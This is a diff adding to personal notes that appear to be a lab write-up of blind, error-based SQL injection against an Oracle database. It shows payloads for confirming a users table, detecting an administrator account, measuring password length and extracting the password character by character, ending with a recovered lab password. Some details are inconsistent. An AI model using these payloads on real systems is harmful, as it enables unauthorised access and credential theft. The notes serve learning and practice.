@@ -23,3 +23,52 @@ Analysis:
 4. cofirm that the users table exist in the database: 
     *** ' || (SELECT '' FROM users) || ' ==> This is giving me 500 error because this is giving me empty entry from each of users table which might break our sql query, try to select this from the single row.
     *** ' || (SELECT '' FROM users WHERE ROWNUM=1) || ' ==> This does gives me 200 res so this indicate that there is table called username.
+5. Confirm the administrator user exist in the user database: 
+  *** This is somehow tricky part: 
+   ***   ' || (SELECT '' FROM users WHERE username='administrator') || ' ==>However this wouldnot works beacuse if the user administrator exist in the database then we get 200res,, and if the user administrator doesnot exist in the database it just doesnotrun the select portion in the database.
+   *** ' || (SELECT '' FROM users WHERE username='administrator') || ' ==> it does also giving me 200res
+   *** ' || (SELECT '' FROM users WHERE username='rabingaire') || '  ==> it does also giving me 200res
+   *** so this tricks doesnot work we need to be more smarter.
+6. We will use the case expansion in the oracle it's similar to if-else statement in the programming.
+  *** ' || (SELECT CASE WHEN (1=1) THEN _ ELSE _ END FROM DUAL) || '==> So, we gonna say SELECT THE CASE WHEN 1=1 then use the tochar function(which is just a oracle function that convert a number or date to string) here, TO_CHAR(1/0) ==> this is invalid this should generate an error:
+  *** so payload is: 
+         ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || ' ==> this is when 1=1 it should perform an (1/0) which will gives us an error but when 1 not equal to 1 it should go to the else part and give us an 200res
+  *** Now, we will be checking does there a username called administrator exist or not in the users table(this method will give us a correct result)
+   *** ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '==> we get an Internal server error which means that the administrator user exist to confirm that let's try somename that the username doesnot exist that should give me an 200res:
+   ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='rabin') || ' ==> gives me an 200res which proves that the username administrator does exist
+
+7. Determine the length of the password:
+     *** ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || ' ==> what this does is if the password is greater then 1 and the username is administrator exist then it will run the select statement and 1=1 and it will go to the (1/0) part and then it will give an error.
+     *** ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>50) || '  ==> what this will do is if the password is greater then 50 and the username is administrator then it will go to the select but the actual password is not greater then 50 so it will not run the select statement and give us a 200res  
+     -> 200 response at 50 -> length of password is less than 50
+     -> so the password is of 20 character Long.
+
+ 8. Now, we know the lenght of the password the last step is to output the administrator password:
+    ** And the way we gonna do is:
+     first letter of password =a? ==> if it is a then output the error if  not the 200res
+     *** so bruteforcing shows that:
+     1st==> m   
+     ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and SUBSTR(password,15,1)='9') || '  
+     so the password is:
+   1= m
+   2= z
+   3= v
+   4= s
+   5= t
+   6= 6
+   7= w
+   8= 0
+   9= t
+   10= s
+   11= b
+   12= 9
+   13= e
+   14= h
+   15= b
+   16= d
+   17= s
+   18= w
+   19= k
+   20= o
+
+so my password is::: mzvst6w0tsb9ehbdswko
